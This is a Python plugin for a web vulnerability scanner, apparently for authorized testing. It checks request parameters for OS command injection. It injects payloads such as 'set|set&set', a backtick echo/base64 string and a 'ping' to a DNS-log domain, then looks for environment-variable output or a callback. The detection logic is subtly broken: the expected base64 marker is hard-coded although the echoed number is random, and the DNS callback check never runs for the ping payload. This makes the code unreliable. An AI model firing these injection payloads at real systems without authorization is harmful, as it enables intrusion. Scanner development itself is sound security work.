#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# w8ay 2019/7/4
# JiuZero 2025/5/15

import copy
import random
import re
from urllib.parse import quote
from lib.core.settings import acceptedExt
from concurrent.futures import ThreadPoolExecutor, as_completed
from lib.core.log import logger
from lib.api.dnslog import DnsLogApi
from lib.api.reverse_api import reverseApi
from api import generateResponse, random_str, updateJsonObjectFromStr, splitUrlPath, conf, PLACE, VulType, POST_HINT, Type, PluginBase

class Z0SCAN(PluginBase):
    name = "cmdi"
    desc = 'Cmd Injection'
    version = "2025.5.15"
    risk = 3
        
    def audit(self):
        url = self.requests.url
        if conf.level == 0 or not 3 in conf.risk:
            return
        if not self.fingerprints.waf and self.requests.suffix in acceptedExt:
            randint = random.randint(1000, 9000)
            payloads = {
                "set|set&set": [
                    r'Path=[\s\S]*?PWD=',
                    r'Path=[\s\S]*?PATHEXT=',
                    r'Path=[\s\S]*?SHELL=',
                    r'Path\x3d[\s\S]*?PWD\x3d',
                    r'Path\x3d[\s\S]*?PATHEXT\x3d',
                    r'Path\x3d[\s\S]*?SHELL\x3d',
                    r'SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=',
                    r'SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d',
                    r'Non-authoritative\sanswer:\s+Name:\s*',
                    r'Server:\s*.*?\nAddress:\s*'
                ],
                "echo `echo {}|base64`{}".format(randint, randint): [
                    "NjE2Mjk4Mwo=6162983"
                ]
            }
            for k, v in self.fingerprints.os.items():
                if k == "WINDOWS":
                    del payloads["echo `echo {}|base64`{}".format(randint, randint)]

            # Dnslog
            dns = reverseApi()

            iterdatas = self.generateItemdatas()
            with ThreadPoolExecutor(max_workers=None) as executor:
                futures = [
                    executor.submit(self.process, _, payloads, dns) for _ in iterdatas
                ]
                try:
                    for future in as_completed(futures):
                        try:
                            future.result()
                        except Exception as task_e:
                            logger.error(f"Task failed: {task_e}", origin=self.name)
                except KeyboardInterrupt:
                    executor.shutdown(wait=False)
                except Exception as e:
                    logger.error(f"Unexpected error: {e}", origin=self.name)
                    executor.shutdown(wait=False)
                
    def process(self, _, payloads, dns):
        if dns.isUseReverse():
            dnsdomain = dns.generate_dns_token()
            dns_token = dnsdomain["token"]
            fullname = dnsdomain["fullname"]
            reverse_payload = "ping -nc 1 {}".format(fullname)
            payloads[reverse_payload] = []
        k, v, position = _
        for _payload, rules in payloads.items():
            payload = self.insertPayload({
                "key": k, 
                "value": v, 
                "payload": _payload, 
                "position": position, 
                })
            r = self.req(position, payload)
            if not r:
                continue
            for rule in rules:
                html1 = r.text
                if re.search(rule, html1, re.I | re.S | re.M):
                    result = self.generate_result()
                    result.main({
                        "type": Type.REQUEST, 
                        "url": r.url, 
                        "vultype": VulType.CMD_INNJECTION, 
                        "show": {
                            "Position": position, 
                            "Param": k, 
                            "Payload": payload
                            }
                        })
                    result.step("Request1", {
                        "position": position,
                        "request": r.reqinfo, 
                        "response": generateResponse(r), 
                        "desc": "Payload: {} Rule: {}".format(payload, rule)
                        })
                    self.success(result)
                    break
                if dns.isUseReverse():
                    dnslist = dns.check(dns_token)
                    if dnslist:
                        result = self.generate_result()
                        result.main({
                            "type": Type.REQUEST, 
                            "url": r.url, 
                            "vultype": VulType.CMD_INNJECTION, 
                            "show": {
                                "Position": position, 
                                "Param": k, 
                                "Payload": payload,
                                "Msg": "Receive from Dnslog",
                                }
                            })
                        result.step("Request1", {
                            "position": position,
                            "request": r.reqinfo, 
                            "response": generateResponse(r), 
                            "desc": "Payload:{} Receive from Dnslog".format(payload),
                            })
                        self.success(result)
                        break
